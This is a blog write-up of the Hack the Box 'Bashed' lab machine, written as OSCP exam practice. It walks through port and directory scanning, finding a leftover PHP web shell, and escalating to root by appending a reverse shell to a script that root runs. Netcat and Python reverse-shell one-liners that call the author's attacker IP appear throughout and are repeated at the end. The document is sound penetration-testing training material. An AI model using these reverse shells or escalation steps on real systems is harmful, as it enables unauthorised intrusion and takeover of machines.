---
layout: post
layout: default
title: "Bashed"
description: "My writeup for the HacktheBox Bashed Machine, a box that involved finding a built-in PHP shell on a website."
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
date: 2021-05-06
---

# Contents
- [Overview](#overview)
  - [Ratings](#ratings)
- [Tags](#tags)
- [Enumeration](#enumeration)
  - [nmap](#nmap)
    - [Full Port Scan](#full-port-scan)
    - [UDP Scan](#udp-scan)
  - [Gobuster](#gobuster)
- [Website](#website)
  - [PHP Web Shell](#php-web-shell)
  - [Trying to Get a Reverse Shell](#trying-to-get-a-reverse-shell)
- [Privesc](#privesc)
  - [Enumeration](#enumeration)
    - [Linpeas](#linpeas)
  - [scriptmanager](#scriptmanager)
    - [Upgrading Shell](#upgrading-shell)
    - [Experimenting with the Python Script](#experimenting-with-the-python-script)
    - [Editing test.py to get a Shell as Root](#editing-testpy-to-get-a-shell-as-root)
- [Key Lessons](#key-lessons)

# Overview

This is the fifth box in my OSCP prep series.

**Box Details**

|IP|User-Rated Difficulty|OS|Date Started|Date Completed|
|---|---|---|---|---|
|10.10.10.68|3.3|Linux|2021-05-05|2021-05-05|

---

This box was pretty easy. The initial foothold was quite simple, and just involved digging around a website to find a webshell that had been left there by a developer. Getting user took me about half an hour including scans.

Priv esc took a little longer - I wasn't working on it with 100% concentration so missed a few key things that I should have spotted straight away. Specifically, `www-data` could run commands as `scriptmanager`, which allowed us to edit a script that was run by root and cause it to instead spawn us a shell. The priv esc was very simple once you found it, but I just looked in the wrong places for a little while. Overall the box took about 2.5 hours.

I did learn a bit about upgrading shells - part of the reason it took me a little longer was because working out of a webshell was slower due to its lower interactivity, but I found a nice new Python reverse shell that I can use in future.

## Ratings

I rated user a 2 for difficulty as there was a bit more guesswork and investigation involved to find a foothold, but ultimately the steps were simple and there was no privesc from `www-data` to `arrexel`.

I rated root a 2 also, but considered rating it a 3. I felt a bit rusty on this box, and struggled a little with remembering my best practices - but overall the privesc was very simple, and once I figured out where to look and managed to upgrade my shell it was plain sailing.

# Tags

#writeup #oscp-prep #linux #web #file-misconfiguration #no-metasploit

# Enumeration

## nmap

I did an initial `nmap` scan:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bashed]
└─$ nmap -sC -sV -v -oA nmap/ 10.10.10.68
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-05 08:29 BST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:29
Completed NSE at 08:29, 0.00s elapsed
Initiating NSE at 08:29
Completed NSE at 08:29, 0.00s elapsed
Initiating NSE at 08:29
Completed NSE at 08:29, 0.00s elapsed
Initiating Ping Scan at 08:29
Scanning 10.10.10.68 [2 ports]
Completed Ping Scan at 08:29, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:29
Completed Parallel DNS resolution of 1 host. at 08:29, 0.00s elapsed
Initiating Connect Scan at 08:29
Scanning 10.10.10.68 [1000 ports]
Discovered open port 80/tcp on 10.10.10.68
Completed Connect Scan at 08:29, 0.48s elapsed (1000 total ports)
Initiating Service scan at 08:29
Scanning 1 service on 10.10.10.68
Completed Service scan at 08:30, 6.06s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.68.
Initiating NSE at 08:30
Completed NSE at 08:30, 0.64s elapsed
Initiating NSE at 08:30
Completed NSE at 08:30, 0.10s elapsed
Initiating NSE at 08:30
Completed NSE at 08:30, 0.00s elapsed
Nmap scan report for 10.10.10.68
Host is up (0.029s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

NSE: Script Post-scanning.
Initiating NSE at 08:30
Completed NSE at 08:30, 0.00s elapsed
Initiating NSE at 08:30
Completed NSE at 08:30, 0.00s elapsed
Initiating NSE at 08:30
Completed NSE at 08:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.82 seconds
```

This shows just a web server, titled "Arrexel's Development SIte" - this exposes a potential user. It is running Apache 2.4.18 on Ubuntu.

### Full Port Scan

As the standard nmap finished so quickly, I cancelled out of the usual `sleep 300` and just ran a full port scan:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bashed]
└─$ nmap -p- -oA nmap/all-ports 10.10.10.68
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-05 08:33 BST
Nmap scan report for 10.10.10.68
Host is up (0.025s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 442.66 seconds
```

This found nothing new.

### UDP Scan

I also ran a UDP scan, which I don't usually do - but as there was only one port open, I thought it was worth doing. Scanning UDP requires root privileges:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bashed]
└─$ sudo nmap -sU -oA nmap/udp 10.10.10.68
[sudo] password for mac: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-05 09:14 BST
Nmap scan report for 10.10.10.68
Host is up (0.023s latency).
All 1000 scanned ports on 10.10.10.68 are closed

Nmap done: 1 IP address (1 host up) scanned in 1086.88 seconds
```

There was nothing running on UDP.

## Gobuster

Once I found the site I ran a gobuster:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bashed]
└─$ gobuster dir -u http://10.10.10.68 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/05 09:04:26 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 290]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/.html                (Status: 403) [Size: 291]                                 
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]    
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]   
/.htm                 (Status: 403) [Size: 290]                                 
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]    
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]    
/.                    (Status: 200) [Size: 7743]                                 
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]  
/.htaccess            (Status: 403) [Size: 295]                                  
/.php3                (Status: 403) [Size: 291]                                  
/.phtml               (Status: 403) [Size: 292]                                  
/.htc                 (Status: 403) [Size: 290]                                  
/.php5                (Status: 403) [Size: 291]                                  
/.html_var_DE         (Status: 403) [Size: 298]                                  
/.php4                (Status: 403) [Size: 291]                                  
/server-status        (Status: 403) [Size: 299]                                  
/.htpasswd            (Status: 403) [Size: 295]                                  
/.html.               (Status: 403) [Size: 292]                                  
/.html.html           (Status: 403) [Size: 296]                                  
/.htpasswds           (Status: 403) [Size: 296]                                  
/.htm.                (Status: 403) [Size: 291]                                  
/.htmll               (Status: 403) [Size: 292]                                  
/.phps                (Status: 403) [Size: 291]                                  
/.html.old            (Status: 403) [Size: 295]                                  
/.ht                  (Status: 403) [Size: 289]                                  
/.html.bak            (Status: 403) [Size: 295]                                  
/.htm.htm             (Status: 403) [Size: 294]                                  
/.hta                 (Status: 403) [Size: 290]                                  
/.htgroup             (Status: 403) [Size: 294]                                  
/.html1               (Status: 403) [Size: 292]                                  
/.html.LCK            (Status: 403) [Size: 295]                                  
/.html.printable      (Status: 403) [Size: 301]                                  
/.htm.LCK             (Status: 403) [Size: 294]                                  
/.html.php            (Status: 403) [Size: 295]                                  
/.htaccess.bak        (Status: 403) [Size: 299]                                  
/.htx                 (Status: 403) [Size: 290]                                  
/.htmls               (Status: 403) [Size: 292]                                  
/.htlm                (Status: 403) [Size: 291]                                  
/.htm2                (Status: 403) [Size: 291]                                  
/.html-               (Status: 403) [Size: 292]                                  
/.htuser              (Status: 403) [Size: 293]                                  
                                                                                 
===============================================================
2021/05/05 09:06:50 Finished
===============================================================
```

This revealed a number of useful directories, including the `/dev` directory which would come in handy later.

# Website

This website seems to be a promotional page for a replica bash shell written in PHP.

![](/assets/images/blogs/Pasted image 20210505083541.png)

The links all point back to `index.html`

![](/assets/images/blogs/Pasted image 20210505085925.png)

I also checked the source, but there were no hidden links and the form submission didn't go anywhere. It did mention PHP:

![](/assets/images/blogs/Pasted image 20210505090749.png)

As the source and the site itself both mention php, I quickly checked if the `.php` extension was valid:

![](/assets/images/blogs/Pasted image 20210505085959.png)

But it seemed the index page at least was running on pure HTML.

The blog post, dated in 2017, suggests that the web shell is available on the server, and even gives us a potential URL:

![](/assets/images/blogs/Pasted image 20210505090142.png)

We can also see the source code at: [https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash). We'll come back to this if needed.

I tried the URL from the screenshot, but it was not found:

![](/assets/images/blogs/Pasted image 20210505090246.png)

Neither was `/phpbash.php`.

## PHP Web Shell

I ran a [quick gobuster](#gobuster) to check for potential directories for the script. It found `/php/` and `/dev/`. I tried `/php/phpbash.php`, and then `/dev/phpbash.php`, which worked:

![](/assets/images/blogs/Pasted image 20210505090543.png)

I did some very quick enumeration, looking for users and quickly finding that `arrexel`'s home directory was world-readable. This gives us the user flag:

![](/assets/images/blogs/Pasted image 20210505091030.png)

## Trying to Get a Reverse Shell

Before I enumerated more for priv esc, I wanted a better shell. I tried a few commands, to no avail:

![](/assets/images/blogs/Pasted image 20210505093721.png)

I googled "netcat openbsd reverse shell" and tried the following commands:

```bash
www-data@bashed:/var/www/html/dev# rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 9001 >/tmp/f

www-data@bashed:/var/www/html/dev# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.13 9001 >/tmp/f
```

But I got no result.

I also tried the `upload` custom command mentioned in the source code, to no avail.

![](/assets/images/blogs/Pasted image 20210505101232.png)

I decided to continue with enumeration and come back to this once I'd rooted the box and see if anyone had done it in a writeup. I would eventually [upgrade my shell](#upgrading-shell).

# Privesc

## Enumeration

I tried some basic enumeration from within the webshell, first checking `uname` and `id`:

```bash
www-data@bashed
:/var/www/html/dev# uname -a

Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

www-data@bashed
:/var/www/html/dev# id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then tried looking for suid binaries:

```bash
www-data@bashed:/var/www/html/dev# find / -perm 4000 2>/dev/null
```

The redirect to `/dev/null` did not work, so I'll spare you the `permission denied` error messages from `/proc`. It did not find any suid bits, but it did highlight some potentially interesting files in a `/scripts`  directory:

```bash
find: '/scripts/test.py': Permission denied  
find: '/scripts/test.txt': Permission denied  
find: '/root': Permission denied  
find: '/home/arrexel/.cache': Permission denied  
find: '/lost+found': Permission denied  
find: '/sys/fs/fuse/connections/38': Permission denied  
find: '/sys/kernel/debug': Permission denied
find: '/var/cache/ldconfig': Permission denied  
find: '/var/cache/apt/archives/partial': Permission denied  
find: '/var/spool/rsyslog': Permission denied  
find: '/var/spool/cron/crontabs/root': Permission denied  
find: '/var/log/apache2': Permission denied  
find: '/var/tmp/systemd-private-6bbc99fde6194264ac09780fc8275331-systemd-timesyncd.service-atvORU': Permission denied  
find: '/var/tmp/systemd-private-c2ef94ff0af9459f95f8df49a4191700-systemd-timesyncd.service-NAuxhT': Permission denied  
find: '/var/lib/apt/lists/partial': Permission denied  
find: '/var/lib/php/sessions': Permission denied  
find: '/run/sudo': Permission denied  
find: '/run/log/journal/37f474e246e601006b77c9705a259ee9': Permission denied  
find: '/run/systemd/inaccessible': Permission denied  
find: '/etc/ssl/private': Permission denied  
find: '/tmp/systemd-private-6bbc99fde6194264ac09780fc8275331-systemd-timesyncd.service-DAJK4C': Permission denied  
find: '/tmp/vmware-root': Permission denied
```

Enumerating files in arrexel:

```bash
www-data@bashed:/var/www/html/dev# ls -la /home/arrexel

total 36
drwxr-xr-x 4 arrexel arrexel 4096 Dec 4 2017 .
drwxr-xr-x 4 root root 4096 Dec 4 2017 ..
-rw------- 1 arrexel arrexel 1 Dec 23 2017 .bash_history
-rw-r--r-- 1 arrexel arrexel 220 Dec 4 2017 .bash_logout
-rw-r--r-- 1 arrexel arrexel 3786 Dec 4 2017 .bashrc
drwx------ 2 arrexel arrexel 4096 Dec 4 2017 .cache
drwxrwxr-x 2 arrexel arrexel 4096 Dec 4 2017 .nano
-rw-r--r-- 1 arrexel arrexel 655 Dec 4 2017 .profile
-rw-r--r-- 1 arrexel arrexel 0 Dec 4 2017 .sudo_as_admin_successful
-r--r--r-- 1 arrexel arrexel 33 Dec 4 2017 user.txt
```

`.sudo_as_admin_successful` looks interesting, but is empty. The `.nano` directory was also empty.

The scripts directory was interesting, but I was blocked from looking at it:

```bash
www-data@bashed:/var/www/html/dev# ls -la /scripts
  
ls: cannot access '/scripts/..': Permission denied  
ls: cannot access '/scripts/test.py': Permission denied  
ls: cannot access '/scripts/test.txt': Permission denied  
ls: cannot access '/scripts/.': Permission denied  
total 0  
d????????? ? ? ? ? ? .  
d????????? ? ? ? ? ? ..  
\-????????? ? ? ? ? ? test.py  
\-????????? ? ? ? ? ? test.txt  

www-data@bashed:/var/www/html/dev# cat /scripts/test.py
  
cat: /scripts/test.py: Permission denied  

www-data@bashed:/var/www/html/dev# cat /scripts/test.txt
  
cat: /scripts/test.txt: Permission denied
```

I tried looking for other interesting files in `/var/www/html`. There was a `config.php` file, but nothing in it besides a fake email for the `php/sendMail.php` file.

I also tried reading the `.bash_history` files for `arrexel` and `scriptmanager`, but I was not allowed.

### Linpeas

I cracked and tried to run linpeas. As this is the first time I've done this in this series, I'll briefly explain the file transfer process. `linpeas.sh` is hosted on my box in a directory full of enumeration scripts. I can run a python server in this directory with `python3 -m http.server`, and download files from it with `wget [IP]:8000/linpeas.sh` - this is the easiest way to transfer files to the remote machine.

I downloaded it to the box, gave it permissions to be executed, and ran it:

```bash
www-data@bashed:/tmp# wget 10.10.14.13:8000/linpeas.sh

  
\--2021-05-05 02:18:03-- http://10.10.14.13:8000/linpeas.sh  
Connecting to 10.10.14.13:8000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 325084 (317K) \[text/x-sh\]  
Saving to: 'linpeas.sh'

www-data@bashed:/tmp# chmod +x linpeas.sh

  
chmod: invalid mode: 'x'  
Try 'chmod --help' for more information.  

www-data@bashed:/tmp# chmod 777 linpeas.sh

  

www-data@bashed:/tmp# ls -la

  
total 360  
drwxrwxrwt 10 root root 4096 May 5 02:18 .  
drwxr-xr-x 23 root root 4096 Dec 4 2017 ..  
drwxrwxrwt 2 root root 4096 May 5 00:29 .ICE-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 .Test-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 .X11-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 .XIM-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 .font-unix  
drwxrwxrwt 2 root root 4096 May 5 00:29 VMwareDnD  
\-rwxrwxrwx 1 www-data www-data 325084 Feb 11 07:48 linpeas.sh  
drwx------ 3 root root 4096 May 5 00:29 systemd-private-6bbc99fde6194264ac09780fc8275331-systemd-timesyncd.service-DAJK4C  
drwx------ 2 root root 4096 May 5 00:29 vmware-root  

www-data@bashed:/tmp# ./linpeas.sh
```

It was harder to read without colours, but `\[1;31m` prefix indicates red.

There were no interesting processes listed, although `dbus` was highlighted. It also highlighted `sudo` as being vulnerable, but that was to a recent CVE and I assumed that was an unintended path as the box was from 2018.

```bash
\[1;33m\[+\] \[1;32mSudo version  
\[0m\[1;34m\[i\] \[1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version  
\[0mSudo version \[1;31m1.8.16\[0m
\[1;33m\[+\] \[1;32mUSBCreator  
\[0m\[1;34m\[i\] \[1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation  
\[0m  
\[1;33m\[+\] \[1;32mPATH  
\[0m\[1;34m\[i\] \[1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses  
\[0m/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Then it highlighted the most basic of enum commands that I had forgotten - checking sudo privileges:

```bash
User \[1;31mwww-data\[0m may run the following commands on bashed:  
(scriptmanager : scriptmanager) \[1;31mNOPASSWD\[0m: \[1;31mALL\[0m
```

Besides this, it found no interesting `cron` jobs or SUID/SGID binaries, or any passwords.

## scriptmanager

As always, I've detailed the important parts of my experimenting as briefly as I can, and included anything new that I learned. Some of this may be obvious to those with more experience, so as always you can [skip to the working exploit](#editing-testpy-to-get-a-shell-as-root).

`www-data` can run commands as `scriptmanager`:

```bash
www-data@bashed:/# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

We can use this to read the contents of the `/scripts` directory:

```bash
www-data@bashed:/# sudo -u scriptmanager ls -la scripts

total 16
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec 4 2017 .
drwxr-xr-x 23 root root 4096 Dec 4 2017 ..
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py
-rw-r--r-- 1 root root 12 May 5 02:41 test.txt

www-data@bashed:/tmp# sudo -u scriptmanager cat /scripts/test.py

  
f = open("test.txt", "w")  
f.write("testing 123!")  
f.close
```

It looked like `test.txt` was owned by root but could still be written to, so I wondered if the `test.py` script somehow ran as root. I wanted to edit it to read the root flag, but was sick of my shell at this point, so tried harder to find one.

### Upgrading Shell

I ran this in the webshell:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

And I got a lovely shell back:

![](/assets/images/blogs/Pasted image 20210505104808.png)

I quickly upgraded my shell:

![](/assets/images/blogs/Pasted image 20210505114032.png)

(i'm not sure why it says `nc -lnvp 9001` in the above)

### Experimenting with the Python Script

However I couldn't find an easy way to edit the file - using `vi` seemed to break down:

![](/assets/images/blogs/Pasted image 20210505105226.png)

I could enter edit mode by pressing `i`, but the arrow keys didn't work and pressing delete just capitalised the characters...

![](/assets/images/blogs/Pasted image 20210505105452.png)

I tried echoing some text:

```bash
www-data@bashed:/$ sudo -u scriptmanager echo 'f = open("/root/root.txt","r");print(f.read())'  >> /scripts/test.py
```

But got this error:

```bash
bash: /scripts/test.py: Permission denied
```

Again, with `>` instead of `>>`:

```bash
www-data@bashed:/$ sudo -u scriptmanager echo "a" > /scripts/test.py
bash: /scripts/test.py: Permission denied
```

It's as if it's trying to execute the final part of the command as `www-data`. I googled this and found [an example](https://unix.stackexchange.com/questions/4335/how-to-insert-text-into-a-root-owned-file-using-sudo) using `tee`:

```bash
echo 'f = open("/root/root.txt","r");print(f.read())' | sudo -u scriptmanager tee -a /scripts/test.py
f = open("/root/root.txt","r");print(f.read())
www-data@bashed:/$ sudo -u scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
f = open("/root/root.txt","r");print(f.read())
```

This worked! However, running the script gives us a permission denied when opening the file:

```bash
www-data@bashed:/$ sudo -u scriptmanager python /scripts/test.py
Traceback (most recent call last):
  File "/scripts/test.py", line 1, in <module>
    f = open("test.txt", "w")
IOError: [Errno 13] Permission denied: 'test.txt'
```

### Editing test.py to get a Shell as Root

So the program does not run as root - but maybe a process running as root is setup to regularly run it?

Linpeas didn't show up a cron job, but I thought I'd take a shot at spawning a shell and hoping the script got executed. I edited it to reuse the shell command from before:

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' | sudo -u scriptmanager tee -a /scripts/test.py
```

I checked that it looked okay:

```bash
www-data@bashed:/$ sudo -u scriptmanager cat /scripts/test.py   
f = open("test.txt", "w")
f.write("testing 123!")
f.close
f = open("/root/root.txt","r");print(f.read())
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

Then I just waited...

After 30 seconds or so I got a shell!

![](/assets/images/blogs/Pasted image 20210505111640.png)

We can grab the flag:

![](/assets/images/blogs/Pasted image 20210505112810.png)

That's the box!

![](/assets/images/blogs/Pasted image 20210505111945.png)

## Key Lessons

This privesc was a little messy from me. I struggled getting an interactive shell, and missed some basic enumeration like `sudo -l` and checking for scheduled processes.

I also could have handled the `.py` file editing better - [0xdf's writeup](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html) involved moving the file to `.py.old` and making a new one, which would have helped in the cleanup process (and for detecting that it was being run in the first place).

I also now have a new Python reverse shell to use - `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")`